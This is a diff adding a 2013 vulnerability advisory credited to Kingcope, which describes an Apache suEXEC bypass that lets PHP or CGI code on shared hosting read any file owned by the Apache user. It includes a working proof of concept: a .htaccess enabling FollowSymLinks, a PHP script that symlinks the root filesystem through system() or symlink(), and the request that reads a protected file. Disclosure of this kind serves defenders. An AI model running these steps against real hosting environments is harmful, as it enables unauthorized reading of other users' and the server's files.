@@ -1,0 +1,93 @@
+Apache suEXEC privilege elevation / information disclosure
+
+Discovered by Kingcope/Aug 2013
+
+The suEXEC feature provides Apache users the ability to run CGI and SSI programs
+under user IDs different from the user ID of the calling web server. Normally,
+when a CGI or SSI program executes, it runs as the same user who is running the
+web server.
+Used properly, this feature can reduce considerably the security risks involved
+with allowing users to develop and run private CGI or SSI programs.
+
+With this bug an attacker who is able to run php or cgi code inside a web
+hosting environment and the environment is configured to use suEXEC as a
+protection mechanism, he/she is able to read any file and directory on the file-
+system of the UNIX/Linux system with the user and group id of the
+apache web server.
+
+Normally php and cgi scripts are not allowed to read files with the apache user-
+id inside a suEXEC configured environment.
+
+Take for example this apache owned file and the php script that follows.
+
+$ ls -la /etc/testapache
+-rw------- 1 www-data www-data 36 Aug  7 16:28 /etc/testapache
+only user www-data should be able to read this file.
+
+$ cat test.php
+<?php
+        system("id; cat /etc/testapache");
+?>
+
+When calling the php file using a webbrowser it will show...
+uid=1002(example) gid=1002(example) groups=1002(example)
+
+because the php script is run trough suEXEC.
+The script will not output the file requested because of a permissions error.
+
+Now if we create a .htaccess file with the content...
+Options Indexes FollowSymLinks
+
+and a php script with the content...
+
+<?php
+        system("ln -sf / test99.php");
+        symlink("/", "test99.php"); // try builtin function in case when
+                                    //system() is blocked
+?>
+in the same folder
+
+..we can access the root filesystem with the apache uid,gid by
+requesting test99.php.
+The above php script will simply create a symbolic link to '/'.
+
+A request to test99.php/etc/testapache done with a web browser shows..
+voila! read with the apache uid/gid
+
+The reason we can now read out any files and traverse directories owned by the
+apache user is because apache httpd displays symlinks and directory listings
+without querying suEXEC.
+It is not possible to write to files in this case.
+
+Version notes. Assumed is that all Apache versions are affected by this bug.
+
+apache2 -V
+Server version: Apache/2.2.22 (Debian)
+Server built:   Mar  4 2013 21:32:32
+Server's Module Magic Number: 20051115:30
+Server loaded:  APR 1.4.6, APR-Util 1.4.1
+Compiled using: APR 1.4.6, APR-Util 1.4.1
+Architecture:   32-bit
+Server MPM:     Worker
+  threaded:     yes (fixed thread count)
+    forked:     yes (variable process count)
+Server compiled with....
+ -D APACHE_MPM_DIR="server/mpm/worker"
+ -D APR_HAS_SENDFILE
+ -D APR_HAS_MMAP
+ -D APR_HAVE_IPV6 (IPv4-mapped addresses enabled)
+ -D APR_USE_SYSVSEM_SERIALIZE
+ -D APR_USE_PTHREAD_SERIALIZE
+ -D APR_HAS_OTHER_CHILD
+ -D AP_HAVE_RELIABLE_PIPED_LOGS
+ -D DYNAMIC_MODULE_LIMIT=128
+ -D HTTPD_ROOT="/etc/apache2"
+ -D SUEXEC_BIN="/usr/lib/apache2/suexec"
+ -D DEFAULT_PIDLOG="/var/run/apache2.pid"
+ -D DEFAULT_SCOREBOARD="logs/apache_runtime_status"
+ -D DEFAULT_ERRORLOG="logs/error_log"
+ -D AP_TYPES_CONFIG_FILE="mime.types"
+ -D SERVER_CONFIG_FILE="apache2.conf"
+
+Cheers,
+/Kingcope
